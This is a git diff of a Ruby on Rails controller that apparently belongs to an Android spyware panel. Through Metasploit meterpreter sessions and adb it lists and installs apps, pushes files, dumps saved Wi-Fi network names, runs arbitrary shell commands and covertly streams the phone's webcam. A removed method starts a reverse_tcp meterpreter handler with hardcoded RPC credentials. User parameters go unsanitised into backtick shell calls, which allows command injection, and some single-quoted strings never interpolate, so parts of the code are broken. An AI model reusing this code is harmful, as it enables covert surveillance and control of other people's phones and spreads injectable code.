@@ -1,5 +1,6 @@
 
 class SmartphonesController < InheritedResources::Base
+  @@isWebcamRecordOn=false
 
   def dump_sysinfo
     processCommand="sysinfo"
@@ -32,29 +33,40 @@ class SmartphonesController < InheritedResources::Base
     end
 
     def uninstall_app
-      processCommand="app_uninstall #{params[:app_name]}"
-      commandOutput=start_msf_process(processCommand)
-      puts commandOutput
-
-      respond_to do |format|
-          format.js { render "uninstall_app", :locals => {:commandOutput => commandOutput}  }
-        end
+      if @@isAdbConnected
+        commandOutput=`tools\\platform-tools\\adb.exe uninstall #{params[:app_name]}`
+      else
+        processCommand="app_uninstall #{params[:app_name]}"
+        commandOutput=start_msf_process(processCommand)
+        puts commandOutput
+    end
+    respond_to do |format|
+        format.js { render "uninstall_app", :locals => {:commandOutput => commandOutput}  }
+      end
     end
 
     def install_app
-      processCommand="app_install #{params[:app_name]}"
-      commandOutput=start_msf_process(processCommand)
-      puts commandOutput
-
+      if @@isAdbConnected
+          commandOutput=`tools\\platform-tools\\adb.exe install #{params[:app_name]}`
+      else
+          processCommand="app_install #{params[:app_name]}"
+          commandOutput=start_msf_process(processCommand)
+          puts commandOutput
+      end
       respond_to do |format|
           format.js { render "install_app", :locals => {:commandOutput => commandOutput}  }
         end
     end
 
     def list_apps
-      processCommand="app_list -#{params[:apps_type]}"
-      commandOutput=start_msf_process(processCommand)
-      puts commandOutput
+      if @@isAdbConnected
+        commandOutput=`tools\\platform-tools\\adb.exe shell pm list packages`
+    else
+        processCommand="app_list -#{params[:apps_type]}"
+        commandOutput=start_msf_process(processCommand)
+        puts commandOutput
+    end
+
 
       respond_to do |format|
           format.js { render "list_apps", :locals => {:commandOutput => commandOutput}  }
@@ -71,15 +83,6 @@ class SmartphonesController < InheritedResources::Base
         end
     end
 
-    def upload_file
-      processCommand="upload #{params[:file_name]}"
-      commandOutput=start_msf_process(processCommand)
-      puts commandOutput
-
-      respond_to do |format|
-          format.js { render "upload_file", :locals => {:commandOutput => commandOutput}  }
-        end
-    end
 
     def wake_lock
       processCommand="wakelock #{params[:flag]}"
@@ -90,6 +93,95 @@ class SmartphonesController < InheritedResources::Base
           format.js { render "wake_lock", :locals => {:commandOutput => commandOutput}  }
         end
     end
+
+    def dump_wifi_info
+      if @@isAdbConnected
+          commandOutput=`tools\\platform-tools\\adb.exe shell "dumpsys wifi | grep SSID: | grep -v rt="`
+      else
+          start_msf_process("shell")
+          processCommand='shell "dumpsys wifi | grep SSID: | grep -v rt="'
+          commandOutput=start_msf_process(processCommand)
+          detach_session
+      end
+          respond_to do |format|
+          format.js { render "dump_wifi_info", :locals => {:commandOutput => commandOutput.split('\n')}  }
+        end
+    end
+
+    def upload_file
+      if @@isAdbConnected
+          commandOutput=`tools\\platform-tools\\adb.exe push #{params[:filePath]} /sdcard/`
+      else
+          processCommand='upload #{params[:filePath]}'
+          commandOutput=start_msf_process(processCommand)
+      end
+          respond_to do |format|
+          format.js { render "upload_file", :locals => {:commandOutput => commandOutput.split('\n')}  }
+        end
+    end
+
+
+    def run_shell_command
+      if @@isAdbConnected
+          commandOutput=`tools\\platform-tools\\adb.exe shell #{params[:shellCommand]}`
+      else
+          start_msf_process("shell")
+          processCommand='#{params[:shellCommand]}'
+          commandOutput=start_msf_process(processCommand)
+          detach_session
+      end
+          respond_to do |format|
+          format.js { render "run_shell_command", :locals => {:commandOutput => commandOutput.split('\n')}  }
+        end
+    end
+
+
+
+
+    def webcam_record
+      commandOutput=[]
+      fileName="None"
+      if !@@isWebcamRecordOn
+          commandTimeout=20
+          currentTime = DateTime.now
+          currentTimeFormat=currentTime.strftime("%Y%m%d%H%M%S")
+          @fileNameJpeg= "webcam_record_" + currentTimeFormat + '.jpeg'
+          @fileNameHtml= "webcam_record_" + currentTimeFormat + '.html'
+          #remove quality
+          processCommand="webcam_stream -v false -i 1 -s #{@fileNameJpeg} -t #{@fileNameHtml}"
+          commandOutput=start_msf_process(processCommand)
+          puts commandOutput
+
+          isOperationSuccessful=false
+          1.upto(commandTimeout) do |n|
+              if system("docker exec kali_container sh -c \"ls | grep #{@fileNameHtml}\"")
+                isOperationSuccessful = true
+                @@isWebcamRecordOn = true
+                sleep 5
+                break
+              else
+                  puts "Waiting ..."
+              end
+              sleep 1
+            end
+
+          commandOutput=["Operation Failed"] if not isOperationSuccessful
+      else
+          commandOutput.append('Control+Z')
+          commandOutput.append(detach_session)
+          @@isWebcamRecordOn = false
+      end
+
+
+
+      respond_to do |format|
+          format.js { render "webcam_record", :locals => {:commandOutput => commandOutput, :fileName => @fileNameHtml}  }
+        end
+  end
+
+
+
+    
 
 
     
@@ -118,36 +210,7 @@ class SmartphonesController < InheritedResources::Base
 
 
 
-    def check_connection
-      adbDevices=`C:\\Users\\Costin\\Desktop\\Workspaces\\android-spyware\\tools\\platform-tools\\adb.exe devices`.split("\n")
-      adbConnected=adbDevices.size > 1 ? true : false
 
-        require 'msfrpc-client'
-        require 'date'
-        user = 'cool'
-        password = 'looc'
-        options = {
-          host: '127.0.0.1',
-          port: 3333,
-          uri:  '/api/',
-          ssl:  true
-        }
-        rpc = Msf::RPC::Client.new(options)
-        rpc.login(user, password)
-        payloadOptions = {
-          'PAYLOAD' => 'android/meterpreter/reverse_tcp',
-          'LHOST'   => '0.0.0.0',
-          'LPORT'   => 4444
-        }
-        job = rpc.call('module.execute', 'exploit', 'multi/handler', payloadOptions)
-        sessions=rpc.call('session.list')
-        msfConnected=sessions.size > 0 ? true : false
-
-      respond_to do |format|
-        format.js { render "check_connection", :locals => {:adbConnected => adbConnected, :msfConnected => msfConnected}  }
-      end
-
-    end
 
     
 
